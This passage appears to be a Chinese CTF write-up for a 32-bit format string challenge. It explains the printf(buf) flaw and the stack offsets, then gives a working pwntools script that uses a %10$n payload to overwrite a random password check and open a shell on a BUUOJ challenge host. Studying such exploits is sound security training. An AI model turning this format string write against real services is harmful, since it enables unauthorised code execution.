 然后会问密码，并把它与随机值进行比对，只有一样才能获得shell

 而我们能利用的还有一处，就是 printf(buf),这是一道格式化字符串的题，就是把我们之前输入的名字部分打印出来，我们可以利用这个漏洞获取信息或地址

正常C语言代码
```python
char buf[99];
scanf("%s",buf);
printf("%s",buf);
```
本题的反常代码类似以下这种情形
```python
char buf[99];
scanf("%s",buf);
printf(buf);
```
这就是我们的漏洞关键所在，我们的输入会被当成格式控制字符串，那么程序就会在当前函数依次输出栈帧内容

本题是32位，32位与64位有一个很大的区别在参数的位置上，64位的前6个参数会为了速度更快而被放在寄存器里面（这就是为什么你在 64 位程序里找偏移，通常要从 %7$x 或 %8$x 开始试），32位参数则直接被压到了栈上

而在正式利用漏洞之前，我们需要知道自己的输入的位置，所以一般会先敲4个（或8个A）进去，找到偏移以后，就方便接下来的步骤

| 符号 | 作用 |
|:-------|:-------:|
|%x|可以读取栈上数据(32位可以用)|
|%p|可以读取栈上数据(是指针类型，64位32位都可以用)|
|%s|读取栈上地址指向的字符串|
|%n|将已输入的字符数写入栈上的地址|

这样就可以构造payload了
原理是利用%n，将已输入的字符串数量写入栈上地址

把随机数地址放入栈上，再根据偏移量是10让%n完美嵌合dword_804C044的位置，又因为0x804c044的字符串数量为4，经过%n的修改，password填4就可以拿到shell

```python
from pwn import *
r=remote("node5.buuoj.cn",28082)

payload=p32(0x804c044)+b"%10$n"
r.sendlineafter("your name:",payload)
r.sendlineafter("your passwd:",b'4')

r.interactive()
```
